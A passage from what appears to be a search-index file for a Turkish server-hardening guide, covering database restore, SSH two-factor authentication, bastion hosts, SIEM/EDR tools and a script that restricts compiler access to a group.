i\u015flemi.</p>"},{"location":"scripts/library/restore/#kullanm","title":"Kullan\u0131m","text":"<pre><code>./scripts/restore-db.sh &lt;backup_file.sql.gz&gt;\n</code></pre>"},{"location":"scripts/library/restore/#prosedur","title":"Prosed\u00fcr","text":"<ol> <li>Yedek Do\u011frulama: Dosya b\u00fct\u00fcnl\u00fc\u011f\u00fc kontrol edilir.</li> <li>Servis Durdurma: Veri tutarl\u0131l\u0131\u011f\u0131 i\u00e7in uygulama durdurulur (opsiyonel).</li> <li>Restore:</li> <li>Mevcut veritaban\u0131 silinir (<code>DROP DATABASE</code>)</li> <li>Yeni veritaban\u0131 olu\u015fturulur</li> <li>Dump import edilir</li> <li>Kontrol: Tablo say\u0131lar\u0131 ve boyutlar raporlan\u0131r.</li> </ol> <p>[!WARNING] Bu i\u015flem mevcut verileri silecektir!</p> <pre><code># \u00d6rnek\n./scripts/restore-db.sh backups/daily-2024-01-01.sql.gz\n</code></pre>"},{"location":"security/","title":"Sunucu G\u00fcvenli\u011fi (Hardening) \ud83d\udee1\ufe0f","text":"<p>Tebrikler! Bu rehberdeki ad\u0131mlar\u0131 tamamlad\u0131ysan\u0131z, sunucunuz art\u0131k s\u0131radan bir Linux kutusu de\u011fil, Katmanl\u0131 Savunma (Defense in Depth) ile korunan bir kaledir.</p> <p>A\u015fa\u011f\u0131daki liste, uygulad\u0131\u011f\u0131m\u0131z t\u00fcm g\u00fcvenlik katmanlar\u0131n\u0131n \u00f6zetidir.</p>"},{"location":"security/#katmanl-guvenlik-mimarisi-defense-in-depth","title":"\ud83e\uddf1 Katmanl\u0131 G\u00fcvenlik Mimarisi (Defense in Depth)","text":"<p>Modern sunucu g\u00fcvenli\u011fi, tek bir \u00f6nleme de\u011fil, birbirini tamamlayan \u00e7ok katmanl\u0131 savunma stratejisine dayan\u0131r. Bir katman a\u015f\u0131lsa bile, di\u011fer katmanlar sald\u0131rgan\u0131 durdurur.</p>"},{"location":"security/#temel-guvenlik-katmanlar","title":"Temel G\u00fcvenlik Katmanlar\u0131","text":"<p>Sistem Temeli: G\u00fcvenlik, temiz bir sistemle ba\u015flar. Gereksiz servisleri temizleyerek sald\u0131r\u0131 y\u00fczeyini k\u00fc\u00e7\u00fclt\u00fcn, otomatik g\u00fcncellemelerle yaz\u0131l\u0131m a\u00e7\u0131klar\u0131n\u0131 kapat\u0131n ve kernel parametrelerini s\u0131k\u0131la\u015ft\u0131rarak network sald\u0131r\u0131lar\u0131n\u0131 engelleyin.</p> <p>Eri\u015fim Kontrol\u00fc: SSH'\u0131 sertle\u015ftirin (port de\u011fi\u015ftirme, root giri\u015fi kapatma, anahtar kullan\u0131m\u0131), 2FA ekleyin ve firewall kurallar\u0131yla sadece gerekli portlar\u0131 a\u00e7\u0131n. CrowdSec veya Fail2ban ile brute-force sald\u0131r\u0131lar\u0131n\u0131 otomatik engelleyin.</p> <p>Dosya Sistemi ve B\u00fct\u00fcnl\u00fck: /tmp dizinini sertle\u015ftirerek zararl\u0131 script \u00e7al\u0131\u015ft\u0131r\u0131lmas\u0131n\u0131 \u00f6nleyin, AIDE ile dosya b\u00fct\u00fcnl\u00fc\u011f\u00fcn\u00fc izleyin ve yetkisiz de\u011fi\u015fiklikleri tespit edin.</p> <p>Kaynak ve K\u0131s\u0131tlamalar: Derleyicileri k\u0131s\u0131tlayarak sunucuda zararl\u0131 yaz\u0131l\u0131m derlenmesini engelleyin, CPU/RAM limitleriyle crypto miner gibi kaynak t\u00fcketen sald\u0131r\u0131lar\u0131 bo\u011fun.</p> <p>Uygulama G\u00fcvenli\u011fi: \u015eifreleri g\u00fcvenli y\u00f6netin (<code>.env</code>, Vault, Docker Secrets), Docker konteynerlerini izole edin (non-root, read-only FS, UserNS) ve monitoring ile anomalileri tespit edin.</p> <p>Malware Korumas\u0131: ClamAV ve Rkhunter ile d\u00fczenli zararl\u0131 taramas\u0131 yap\u0131n.</p>"},{"location":"security/#ileri-seviye-katmanlar","title":"\u0130leri Seviye Katmanlar","text":"<p>Temel g\u00fcvenlik sa\u011fland\u0131ktan sonra, Bastion Host ile eri\u015fim noktalar\u0131n\u0131 merkezile\u015ftirin, Honeypot ve Tarpit ile sald\u0131rganlar\u0131 tuza\u011fa d\u00fc\u015f\u00fcr\u00fcn, OpenSCAP ile uyumluluk standartlar\u0131n\u0131 kontrol edin ve SIEM/EDR ara\u00e7lar\u0131yla kurumsal d\u00fczeyde tehdit analizi yap\u0131n.</p> <p>T\u00fcm katmanlar\u0131n etkinli\u011fini d\u00fczenli olarak Lynis ile test edin.</p>"},{"location":"security/#uygulama-sras-roadmap","title":"\ud83d\ude80 Uygulama S\u0131ras\u0131 (Roadmap)","text":"<p>S\u0131f\u0131rdan kuruluma ba\u015flad\u0131ysan\u0131z bu s\u0131ray\u0131 takip edin:</p>"},{"location":"security/#asama-1-temel-ilk-kurulum","title":"A\u015fama 1: Temel (\u0130lk Kurulum)","text":"<ol> <li>Servisleri Temizle</li> <li>G\u00fcncellemeleri A\u00e7</li> <li>SSH Ayarla</li> <li>Firewall A\u00e7</li> </ol>"},{"location":"security/#asama-2-sklastrma-hardening","title":"A\u015fama 2: S\u0131k\u0131la\u015ft\u0131rma (Hardening)","text":"<ol> <li>Kernel Ayarlar\u0131</li> <li>Fail2ban/Crowdsec Kur</li> <li>/tmp Hardening</li> <li>Derleyicileri K\u0131s\u0131tla</li> </ol>"},{"location":"security/#asama-3-ileri-seviye-paranoya-modu","title":"A\u015fama 3: \u0130leri Seviye (Paranoya Modu)","text":"<ol> <li>SSH 2FA Ekle</li> <li>Docker Hardening Uygula</li> <li>Monitoring Scriptlerini Kur</li> <li>Her \u015eeyi Tara (Lynis)</li> </ol>"},{"location":"security/#hangisini-secmeliyim-crowdsec-mi-fail2ban-mi","title":"Hangisini Se\u00e7meliyim: CrowdSec mi Fail2ban mi?","text":"Kriter Fail2ban \ud83d\udc0d CrowdSec \ud83d\udc39 Teknoloji Python (Eski, G\u00fcvenilir) Go (Modern, Bulut Tabanl\u0131) Koruma Reaktif: Size sald\u0131r\u0131rsa banlar. Proaktif: D\u00fcnyada birine sald\u0131ran\u0131 size gelmeden banlar. \u00d6neri 512MB RAM alt\u0131 sunucular i\u00e7in. Modern, 1GB+ RAM sunucular i\u00e7in (\u00d6nerilen). <p>[!TIP] G\u00fcvenlik bir var\u0131\u015f noktas\u0131 de\u011fil, yolculuktur. Haftal\u0131k Lynis taramalar\u0131n\u0131z\u0131 aksatmay\u0131n!</p>"},{"location":"security/2fa/","title":"SSH \u0130\u00e7in 2FA (\u0130ki A\u015famal\u0131 Do\u011frulama) \ud83d\udd10","text":"<p>SSH anahtar\u0131n\u0131z\u0131 \u00e7ald\u0131rsan\u0131z bile, telefonunuzdaki kod olmadan kimsenin sunucuya girememesini sa\u011flay\u0131n. Bu rehberde Google Authenticator kullanarak SSH g\u00fcvenli\u011fini en \u00fcst seviyeye \u00e7\u0131karaca\u011f\u0131z.</p>"},{"location":"security/2fa/#1-kurulum","title":"1. Kurulum","text":"<p>Gerekli PAM mod\u00fcl\u00fcn\u00fc kural\u0131m:</p> <pre><code>sudo apt update\nsudo apt install libpam-google-authenticator -y\n</code></pre>"},{"location":"security/2fa/#2-2fay-aktif-etme","title":"2. 2FA'y\u0131 Aktif Etme","text":"<p>Bu komutu kendi kullan\u0131c\u0131n\u0131zla (root olmayan) \u00e7al\u0131\u015ft\u0131r\u0131n:</p> <pre><code>google-authenticator\n</code></pre> <p>Size soraca\u011f\u0131 sorulara \u015fu cevaplar\u0131 verin:</p> <ol> <li>Do you want authentication tokens to be time-based? -&gt; <code>y</code> (Evet)</li> <li>QR Kodu: Ekranda kocaman bir QR kod \u00e7\u0131kacak. Bunu telefonunuzdaki Google Authenticator veya Authy uygulamas\u0131na okutun.</li> <li>Secret Key &amp; Recovery Codes: Bu kodlar\u0131 g\u00fcvenli bir yere kaydedin! (Telefonunuz kaybolursa sunucuya girmek i\u00e7in laz\u0131m olur).</li> <li>Update the .google_authenticator file? -&gt; <code>y</code> (Ayarlar\u0131 kaydet)</li> <li>Disallow multiple uses of the same authentication token? -&gt; <code>y</code> (Ayn\u0131 kodu iki kere kullanamas\u0131nlar - Replay Attack korumas\u0131)</li> <li>Increase the time-skew window? -&gt; <code>n</code> (Hay\u0131r, saatimiz senkronize kals\u0131n)</li> <li>Enable rate-limiting? -&gt; <code>y</code> (Evet, brute-force korumas\u0131)</li> </ol>"},{"location":"security/2fa/#3-sshd-ve-pam-yaplandrmas","title":"3. SSHD ve PAM Yap\u0131land\u0131rmas\u0131","text":"<p>\u015eimdi SSH servisine \"Giri\u015fte bu mod\u00fcl\u00fc kullan\" diyece\u011fiz.</p>"},{"location":"security/2fa/#a-pam-ayar","title":"A) PAM Ayar\u0131","text":"<p>Dosyay\u0131 a\u00e7\u0131n:</p> <pre><code>sudo nano /etc/pam.d/sshd\n</code></pre> <p>En alta \u015fu sat\u0131r\u0131 ekleyin (veya <code>@include common-auth</code> sat\u0131r\u0131n\u0131 bulup onun alt\u0131na ekleyin):</p> <pre><code># Google Authenticator 2FA\nauth required pam_google_authenticator.so\n</code></pre>"},{"location":"security/2fa/#b-sshd-ayar","title":"B) SSHD Ayar\u0131","text":"<p>SSH Config dosyas\u0131n\u0131 a\u00e7\u0131n:</p> <pre><code>sudo nano /etc/ssh/sshd_config\n</code></pre> <p>\u015eu ayar\u0131 bulun ve <code>yes</code> yap\u0131n (Yoksa ekleyin):</p> <pre><code>KbdInteractiveAuthentication yes\n# Not: Baz\u0131 eski s\u00fcr\u00fcmlerde \"ChallengeResponseAuthentication yes\" olabilir.\n</code></pre> <p>E\u011fer SSH Anahtar\u0131 kullan\u0131yorsan\u0131z, hem anahtar hem de \u015fifre istemesi i\u00e7in \u015funu ekleyin (Dosyan\u0131n en alt\u0131na):</p> <pre><code># Hem SSH Key hem de 2FA Kodu ZORUNLU olsun:\nAuthenticationMethods publickey,keyboard-interactive\n</code></pre>"},{"location":"security/2fa/#4-servisi-yeniden-baslatma","title":"4. Servisi Yeniden Ba\u015flatma","text":"<p>Ayarlar\u0131 uygulayal\u0131m:</p> <pre><code>sudo systemctl restart ssh\n</code></pre> <p>\u26a0\ufe0f \u00c7OK \u00d6NEML\u0130 UYARI: \u015eu anki terminal penceresini SAKIN KAPATMAYIN! Yeni bir terminal a\u00e7\u0131p ba\u011flanmay\u0131 deneyin. E\u011fer hata yap\u0131ld\u0131ysa mevcut pencereden d\u00fczeltebilirsiniz. Kapat\u0131rsan\u0131z sunucu d\u0131\u015far\u0131da kal\u0131rs\u0131n\u0131z!</p>"},{"location":"security/2fa/#5-baglant-testi","title":"5. Ba\u011flant\u0131 Testi","text":"<p>Yeni bir terminal a\u00e7\u0131n ve ba\u011flanmay\u0131 deneyin:</p> <pre><code>ssh kullanici@sunucu-ip\n</code></pre> <p>S\u00fcre\u00e7 \u015f\u00f6yle i\u015flemeli:</p> <ol> <li>\u00d6nce SSH anahtar\u0131n\u0131z\u0131 do\u011frular (\u015fifre sormaz).</li> <li>Ard\u0131ndan <code>Verification code:</code> diye sorar.</li> <li>Telefondaki 6 haneli kodu girersiniz.</li> <li>Giri\u015f Ba\u015far\u0131l\u0131! \ud83c\udf89</li> </ol>"},{"location":"security/advanced-tools/","title":"\u0130leri Seviye G\u00fcvenlik (SIEM &amp; EDR) \ud83d\ude80","text":"<p>Bu rehberde anlat\u0131lan ara\u00e7lar (Lynis, UFW, Fail2Ban) tekil sunucular (Host-Based) i\u00e7in m\u00fckemmeldir. Ancak sunucu say\u0131n\u0131z artt\u0131\u011f\u0131nda veya kurumsal bir yap\u0131ya ge\u00e7ti\u011finizde, merkezi bir y\u00f6netim ve daha derin analiz gerekir.</p> <p>Bu sayfa, projenizin bir sonraki a\u015famas\u0131nda (enterprise-ready) kullanabilece\u011finiz ara\u00e7lar\u0131 tan\u0131t\u0131r.</p>"},{"location":"security/advanced-tools/#1-wazuh-siem-xdr","title":"1. Wazuh (SIEM &amp; XDR)","text":"<p>\"A\u00e7\u0131k Kaynakl\u0131 G\u00fcvenlik Platformu\"</p> <p>Wazuh, sunucular\u0131n\u0131zdan loglar\u0131 toplar, analiz eder ve bir sald\u0131r\u0131 an\u0131nda alarm \u00fcretir.</p> <ul> <li>\u00d6zellik: Merkezi Log Y\u00f6netimi, Dosya B\u00fct\u00fcnl\u00fc\u011f\u00fc (FIM), Malware Tespiti, Docker \u0130zleme.</li> <li>Mimari: Her sunucuya bir \"Wazuh Agent\" kurulur, merkezi bir \"Wazuh Manager\" sunucusuna veri g\u00f6nderir.</li> <li>Maliyet: Open Source (Bedava).</li> <li>Ne Zaman Kullan\u0131lmal\u0131? 3+ sunucunuz oldu\u011funda ve merkezi log y\u00f6netimi gerekti\u011finde.</li> </ul>"},{"location":"security/advanced-tools/#2-osquery-edr","title":"2. Osquery (EDR)","text":"<p>\"SQL ile Sistem Sorgulama\"</p> <p>Facebook taraf\u0131ndan geli\u015ftirilen bu ara\u00e7, i\u015fletim sistemini ili\u015fkisel bir veritaban\u0131 gibi g\u00f6rmenizi sa\u011flar.</p> <ul> <li>\u00d6zellik: Sistem durumunu SQL sorgular\u0131yla analiz etme.</li> <li>\u00d6rnek Sorgu: <pre><code>SELECT pid, name, path FROM processes WHERE name = 'nginx';\nSELECT * FROM listening_ports WHERE port = 22;\n</code></pre></li> <li>Ne Zaman Kullan\u0131lmal\u0131? Filo y\u00f6netimi (Fleet Management) ve derinlemesine sistem analizi i\u00e7in.</li> </ul>"},{"location":"security/advanced-tools/#3-nessus-openvas-vulnerability-scanner","title":"3. Nessus / OpenVAS (Vulnerability Scanner)","text":"<p>\"Sald\u0131rgan G\u00f6z\u00fcyle Tarama\"</p> <p>Lynis \"i\u00e7eriden\" bakar, Nessus ise \"d\u0131\u015far\u0131dan\" veya \"a\u011f \u00fczerinden\" bakar.</p> <ul> <li>\u00d6zellik: Bilinen g\u00fcvenlik a\u00e7\u0131klar\u0131n\u0131 (CVE), eski yaz\u0131l\u0131mlar\u0131 ve yanl\u0131\u015f konfig\u00fcrasyonlar\u0131 tarar.</li> <li>Nessus: End\u00fcstri standard\u0131d\u0131r ama \u00fccretlidir (Essentials s\u00fcr\u00fcm\u00fc s\u0131n\u0131rl\u0131 \u00fccretsiz).</li> <li>OpenVAS (Greenbone): Tamamen a\u00e7\u0131k kaynakl\u0131 alternatifidir.</li> <li>Ne Zaman Kullan\u0131lmal\u0131? PCI-DSS uyumlulu\u011fu veya Pen-Test (S\u0131zma Testi) s\u00fcre\u00e7lerinde.</li> </ul>"},{"location":"security/advanced-tools/#4-karslastrma-tablosu","title":"4. Kar\u015f\u0131la\u015ft\u0131rma Tablosu","text":"Ara\u00e7 Kategori Odak Noktas\u0131 Kurulum Lynis Audit Hardening &amp; Best Practice \u00c7ok Kolay Wazuh SIEM / XDR Log Analizi &amp; Tehdit Av\u0131 Orta (Merkezi Sunucu Gerektirir) Osquery EDR Sistem Envanteri &amp; Sorgulama Orta OpenVAS Scanner Zafiyet Taramas\u0131 (Vulnerability) Zor (A\u011f\u0131r bir ara\u00e7t\u0131r) <p>[!TIP] Ba\u015flang\u0131\u00e7 i\u00e7in Lynis yeterlidir. Sunucu say\u0131n\u0131z 5'i ge\u00e7ti\u011finde Wazuh kurmay\u0131 d\u00fc\u015f\u00fcnebilirsiniz.</p>"},{"location":"security/bastion/","title":"Bastion Host (Jump Box) Mimarisi \ud83c\udff0","text":"<p>Bastion Host (Kale Sunucusu), a\u011f\u0131n\u0131z\u0131n tek giri\u015f kap\u0131s\u0131d\u0131r. Di\u011fer t\u00fcm sunucular internete kapal\u0131d\u0131r (Private Network), sadece Bastion sunucusundan gelen ba\u011flant\u0131lar\u0131 kabul ederler.</p> <p>Bu yap\u0131, sald\u0131r\u0131 y\u00fczeyini tek bir noktaya indirger ve bu noktay\u0131 \u00e7ok s\u0131k\u0131 koruman\u0131za olanak tan\u0131r.</p>"},{"location":"security/bastion/#1-mimari","title":"1. Mimari","text":"<pre><code>graph LR\n    User[\ud83d\udcbb Sen (Laptop)] --&gt;|SSH (22)| Bastion[\ud83c\udff0 Bastion Host\\n(Public IP)]\n    Bastion --&gt;|SSH (Internal)| App1[App Server 1\\n(Private IP)]\n    Bastion --&gt;|SSH (Internal)| DB1[DB Server 1\\n(Private IP)]\n\n    style Bastion fill:#f96,stroke:#333\n    style User fill:#fff,stroke:#333\n</code></pre> <ul> <li>Bastion: Public IP'ye sahip tek sunucu. \u00c7ok s\u0131k\u0131 g\u00fcvenlik \u00f6nlemleri var (2FA, IP Whitelist).</li> <li>Internal Sunucular: Sadece Private IP'leri var. D\u0131\u015f d\u00fcnyadan SSH eri\u015fimi YOK.</li> </ul>"},{"location":"security/bastion/#2-bastion-sunucu-kurulumu","title":"2. Bastion Sunucu Kurulumu","text":"<p>Bu sunucu \u00fczerinde hi\u00e7bir uygulama \u00e7al\u0131\u015fmamal\u0131d\u0131r. Sadece SSH servisi olmal\u0131d\u0131r.</p>"},{"location":"security/bastion/#adm-1-sklastrma-hardening","title":"Ad\u0131m 1: S\u0131k\u0131la\u015ft\u0131rma (Hardening)","text":"<p>Standart g\u00fcvenlik \u00f6nlemlerini (Key-only auth, root login disable) uygulay\u0131n. Ek olarak:</p> <p>/etc/ssh/sshd_config</p> <pre><code># Sadece forwarding ve jump i\u00e7in izin ver\nAllowTcpForwarding yes\nX11Forwarding no\nPermitTunnel no\nAllowAgentForwarding yes\n</code></pre>"},{"location":"security/bastion/#adm-2-2fa-google-authenticator","title":"Ad\u0131m 2: 2FA (Google Authenticator)","text":"<p>Bu sunucuya giren herkesin telefonundaki kodu girmesi zorunlu olmal\u0131d\u0131r. (Detaylar i\u00e7in Google Auth (2FA) sayfas\u0131na bak\u0131n)</p>"},{"location":"security/bastion/#adm-3-firewall-kritik","title":"Ad\u0131m 3: Firewall (Kritik!)","text":"<p>Sadece y\u00f6neticilerin IP adreslerine izin verin.</p> <pre><code>sudo ufw default deny incoming\nsudo ufw allow from 88.241.x.x to any port 22\nsudo ufw enable\n</code></pre>"},{"location":"security/bastion/#3-baglant-client-usage","title":"3. Ba\u011flant\u0131 (Client Usage)","text":"<p>Bastion kullanmak zor veya yava\u015f de\u011fildir. <code>ProxyJump</code> \u00f6zelli\u011fi ile sanki direkt ba\u011flan\u0131yormu\u015fsunuz gibi \u00e7al\u0131\u015f\u0131r.</p>"},{"location":"security/bastion/#yontem-1-tek-seferlik-komut-j","title":"Y\u00f6ntem 1: Tek Seferlik Komut (-J)","text":"<pre><code># Format: ssh -J &lt;bastion-user&gt;@&lt;bastion-host&gt; &lt;target-user&gt;@&lt;target-host&gt;\n\nssh -J admin@bastion.example.com root@10.0.0.5\n</code></pre> <p>Terminal size \u00f6nce Bastion \u015fifresini/anahtar\u0131n\u0131 sorar (veya bilgisayar\u0131n\u0131zdaki key'i kullan\u0131r), sonra hedef sunucuya sizi f\u0131rlat\u0131r.</p>"},{"location":"security/bastion/#yontem-2-ssh-config-otomatik","title":"Y\u00f6ntem 2: SSH Config (Otomatik) \ud83d\ude80","text":"<p>Bilgisayar\u0131n\u0131zdaki <code>~/.ssh/config</code> dosyas\u0131na \u015fu ayar\u0131 yap\u0131n.</p> <pre><code># 1. Bastion Sunucusu\nHost bastion\n    HostName bastion.example.com\n    User admin\n    IdentityFile ~/.ssh/id_rsa\n\n# 2. Arka Plandaki Sunucular (Private IP)\nHost app-server\n    HostName 10.0.0.5\n    User root\n    # Sihirli sat\u0131r: Bastion \u00fczerinden yap\n    ProxyJump bastion\n</code></pre> <p>Art\u0131k sadece sunucu ismini yazman\u0131z yeterli:</p> <pre><code>ssh app-server\n</code></pre> <p>Arka planda otomatik olarak Bastion \u00fczerinden t\u00fcnel a\u00e7\u0131l\u0131r.</p>"},{"location":"security/bastion/#4-avantajlar","title":"4. Avantajlar","text":"<ol> <li>Tek Noktadan Denetim: Kimin ne zaman ba\u011fland\u0131\u011f\u0131n\u0131 sadece Bastion loglar\u0131na bakarak g\u00f6rebilirsiniz.</li> <li>Yama Y\u00f6netimi: Sadece tek bir sunucunun SSH servisini g\u00fcncellemek ve korumakla y\u00fck\u00fcml\u00fcs\u00fcn\u00fcz.</li> <li>\u0130zolasyon: Arka plandaki veritaban\u0131 veya uygulama sunucular\u0131n\u0131 <code>0.0.0.0</code>'a a\u00e7man\u0131za gerek kalmaz.</li> </ol>"},{"location":"security/bastion/#5-farkl-ag-senaryolar","title":"5. Farkl\u0131 A\u011f Senaryolar\u0131","text":"<p>Bastion sunucusunun nerede oldu\u011funa g\u00f6re iki farkl\u0131 kurulum stratejisi vard\u0131r.</p>"},{"location":"security/bastion/#senaryo-a-ayn-agda-vpclan-onerilen","title":"Senaryo A: Ayn\u0131 A\u011fda (VPC/LAN) - \u2b50 \u00d6nerilen","text":"<p>En g\u00fcvenli y\u00f6ntemdir. Hedef sunucular\u0131n Public IP adresi yoktur.</p> <ul> <li>Bastion: Public IP + Private IP (\u00f6rn: <code>10.0.0.2</code>)</li> <li>App Server: Sadece Private IP (\u00f6rn: <code>10.0.0.5</code>)</li> </ul> <p>Sald\u0131rgan App Server'a istese de ula\u015famaz \u00e7\u00fcnk\u00fc internete kapal\u0131d\u0131r. Bastion \u00fczerinden <code>10.0.0.5</code>'e t\u00fcnel at\u0131l\u0131r.</p>"},{"location":"security/bastion/#senaryo-b-farkl-aglarda-remote-bastion","title":"Senaryo B: Farkl\u0131 A\u011flarda (Remote Bastion)","text":"<p>E\u011fer Bastion AWS'de, App Server ise ba\u015fka bir veri merkezindeyse ve aralar\u0131nda \u00f6zel bir a\u011f (VPN/VPC Peering) yoksa:</p> <ul> <li>Bastion: Public IP (<code>88.x.x.x</code>)</li> <li>App Server: Public IP (<code>99.x.x.x</code>)</li> </ul> <p>G\u00fcvenlik Kural\u0131 (Whitelist): App Server 'herkese' a\u00e7\u0131k IP'ye sahip olsa bile, Firewall (UFW) kural\u0131 ile sadece Bastion'un IP'sini kabul etmelidir.</p> <p>App Server \u00fczerinde:</p> <pre><code># 1. Herkese kapat\nsudo ufw deny 22\n\n# 2. SADECE Bastion sunucusuna a\u00e7\nsudo ufw allow from 88.x.x.x to any port 22\n</code></pre> <p>B\u00f6ylece App Server internete a\u00e7\u0131k olsa bile, Bastion d\u0131\u015f\u0131nda kimse SSH yapamaz.</p>"},{"location":"security/compilers/","title":"Derleyicileri K\u0131s\u0131tlama (Hardening Compilers)","text":"<p>\u00dcretim (Production) sunucular\u0131nda <code>gcc</code>, <code>make</code>, <code>g++</code> gibi derleyicilerin herkes taraf\u0131ndan ula\u015f\u0131labilir olmas\u0131 b\u00fcy\u00fck bir g\u00fcvenlik riskidir.</p>"},{"location":"security/compilers/#1-neden-tehlikeli","title":"1. Neden Tehlikeli?","text":"<p>Sald\u0131rgan sunucuya s\u0131zarsa (\u00f6rne\u011fin bir web a\u00e7\u0131\u011f\u0131 ile <code>www-data</code> kullan\u0131c\u0131s\u0131 olsa), sunucudaki kernel s\u00fcr\u00fcm\u00fcne uygun bir Exploit (s\u00f6m\u00fcr\u00fc kodu) indirip derlemek ister.</p>"},{"location":"security/compilers/#onemli-uyar-bu-bir-gumus-kursun-degildir","title":"\u26a0\ufe0f \u00d6nemli Uyar\u0131: Bu Bir \"G\u00fcm\u00fc\u015f Kur\u015fun\" De\u011fildir!","text":"<p>Derleyicileri k\u0131s\u0131tlamak sald\u0131rgan\u0131 tamamen durdurmaz, sadece yava\u015flat\u0131r (Speed Bump). Sald\u0131rgan \u015funlar\u0131 hala yapabilir:</p> <ul> <li>Kendi bilgisayar\u0131nda derledi\u011fi haz\u0131r binary'i sunucuya y\u00fckleyip \u00e7al\u0131\u015ft\u0131rabilir.</li> <li>Python, Perl gibi yorumlay\u0131c\u0131larla exploit \u00e7al\u0131\u015ft\u0131rabilir.</li> </ul> <p>Bu y\u00fczden bu i\u015flem daha \u00e7ok Lynis/CIS gibi compliance (uyumluluk) standartlar\u0131 i\u00e7in yap\u0131l\u0131r.</p> <p>\ud83d\udca1 Ger\u00e7ek G\u00fcvenlik Katmanlar\u0131 (\u00d6ncelik S\u0131ras\u0131):</p> <ol> <li>\ud83d\udd34 Kernel G\u00fcncellemeleri: Exploit'i anlams\u0131z k\u0131lar (En kritik!).</li> <li>\ud83d\udd34 Auditd + Loglama: Sald\u0131r\u0131y\u0131 g\u00f6rmenizi sa\u011flar.</li> <li>\ud83d\udfe1 AppArmor/SELinux: Ger\u00e7ek process izolasyonu sa\u011flar.</li> <li>\ud83d\udfe1 Noexec Mount: <code>/tmp</code> dizininde \u00e7al\u0131\u015ft\u0131rmay\u0131 engeller.</li> <li>\ud83d\udfe2 Derleyici K\u0131s\u0131tlama: Sald\u0131rgan\u0131 biraz u\u011fra\u015ft\u0131r\u0131r.</li> </ol>"},{"location":"security/compilers/#2-yontem-grup-tabanl-kstlama-kapsaml-script","title":"2. Y\u00f6ntem: Grup Tabanl\u0131 K\u0131s\u0131tlama (Kapsaml\u0131 Script) \u2705","text":"<p>Sadece <code>gcc</code> k\u0131s\u0131tlamak yetmez. <code>gcc-12</code> gibi symlink hedefleri ve <code>ld</code>, <code>make</code>, <code>as</code> gibi yard\u0131mc\u0131 ara\u00e7lar da k\u0131s\u0131tlanmal\u0131d\u0131r.</p> <p>A\u015fa\u011f\u0131daki scripti <code>lock_compilers.sh</code> olarak kaydedip \u00e7al\u0131\u015ft\u0131r\u0131n. Bu script:</p> <ol> <li><code>compiler</code> ad\u0131nda grup olu\u015fturur.</li> <li>T\u00fcm derleyicileri, linker'lar\u0131 ve debugger'lar\u0131 bulur.</li> <li>\u0130zinleri <code>750</code> yapar (sadece root ve compiler grubu \u00e7al\u0131\u015ft\u0131rabilir).</li> <li>Symlink'lerin g\u00f6sterdi\u011fi as\u0131l dosyalar\u0131 da k\u0131s\u0131tlar.</li> </ol>"},{"location":"security/compilers/#script-icerigi","title":"Script \u0130\u00e7eri\u011fi","text":"<pre><code>#!/bin/bash\n# compiler_hardening.sh - Daha kapsaml\u0131 versiyon\n\nCOMPILER_GROUP=\"compiler\"\n\n# 1. Grup olu\u015ftur\nsudo groupadd -f \"$COMPILER_GROUP\"\necho \"[+] '$COMPILER_GROUP' grubu olu\u015fturuldu/kontrol edildi.\"\n\n# 2. K\u0131s\u0131tlanacak Temel Binary Listesi\n# \u00d6nce sabit isimleri ekle\nBINARIES=(\n    /usr/bin/gcc\n    /usr/bin/g++\n    /usr/bin/cc /usr/bin/c++\n    /usr/bin/make /usr/bin/cmake\n    /usr/bin/as /usr/bin/ld /usr/bin/ld.bfd /usr/bin/ld.gold\n    /usr/bin/ar /usr/bin/ranlib /usr/bin/nm\n    /usr/bin/objcopy /usr/bin/objdump /usr/bin/strip\n    /usr/bin/clang /usr/bin/clang++\n)\n\n# Versiyonlu binaryleri (gcc-12 gibi) g\u00fcvenli bir \u015fekilde ekle\nfor bin in /usr/bin/gcc-* /usr/bin/g++-* /usr/bin/clang-* 2&gt;/dev/null; do\n    [ -e \"$bin\" ] &amp;&amp; BINARIES+=(\"$bin\")\ndone\n\n# 3. Binary'leri K\u0131s\u0131tla\nfor bin in \"${BINARIES[@]}\"; do\n    if [ -e \"$bin\" ] &amp;&amp; [ ! -L \"$bin\" ]; then\n        sudo chgrp \"$COMPILER_GROUP\" \"$bin\"\n        sudo chmod 750 \"$bin\"\n        echo \"[+] K\u0131s\u0131tland\u0131: $bin\"\n    fi\ndone\n\n# 4. Symlink Hedeflerini K\u0131s\u0131tla (\u00d6rn: gcc -&gt; gcc-12)\nfor bin in /usr/bin/gcc /usr/bin/g++ /usr/bin/cc; do\n    if [ -L \"$bin\" ]; then\n        target=$(readlink -f \"$bin\")\n        if [ -e \"$target\" ]; then\n            sudo chgrp \"$COMPILER_GROUP\" \"$target\"\n            sudo chmod 750 \"$target\"\n            echo \"[+] Symlink hedefi k\u0131s\u0131tland\u0131: $target\"\n        fi\n    fi\ndone\n\necho \"\"\necho \"[!] Manuel kontrol \u00f6nerisi:\"\necho \"    which -a gcc    # Ba\u015fka PATH'te gcc var m\u0131?\"\necho \"    ls /usr/local/bin/gcc* 2&gt;/dev/null\"\necho \"\"\necho \"\u2705 \u0130\u015flem tamamland\u0131. Art\u0131k sadece 'root' ve 'compiler' grubu derleme yapabilir.\"\n</code></pre>"},{"location":"security/compilers/#scripti-calstrma","title":"Scripti \u00c7al\u0131\u015ft\u0131rma","text":"<pre><code>sudo chmod +x lock_compilers.sh\nsudo ./lock_compilers.sh\n</code></pre>"},{"location":"security/compilers/#yetkili-kullanc-ekleme","title":"Yetkili Kullan\u0131c\u0131 Ekleme","text":"<p>E\u011fer bir kullan\u0131c\u0131n\u0131n (veya CI/CD agent'\u0131n) derleme yapmas\u0131 gerekirse:</p> <pre><code>sudo usermod -aG compiler $USER\n# De\u011fi\u015fikli\u011fin aktif olmas\u0131 i\u00e7in logout/login yap\u0131n\n</code></pre>"},{"location":"security/compilers/#3-dogrulama","title":"3. Do\u011frulama","text":"<p>Normal bir kullan\u0131c\u0131 (gruba dahil olmayan) ile deneyelim:</p> <pre><code># root olmayan, gruba eklenmemi\u015f bir kullan\u0131c\u0131ya ge\u00e7 (\u00f6rn: nobody)\nsu -s /bin/bash nobody\n\n# \u00c7al\u0131\u015ft\u0131rmay\u0131 dene\ngcc --version\n# Beklenen Hata: \"Permission denied\" veya \"Eri\u015fim engellendi\"\n\n# Linker dene\nld --version\n# Beklenen Hata: \"Permission denied\"\n\nexit\n</code></pre> <p>Sonu\u00e7: Sald\u0131rgan art\u0131k sunucu \u00fczerinde rahat\u00e7a \"make\", \"gcc\" diyemeyecek. Kernel exploit derlemek i\u00e7in kendi makinesinde cross-compile yap\u0131p ta\u015f\u0131mas\u0131 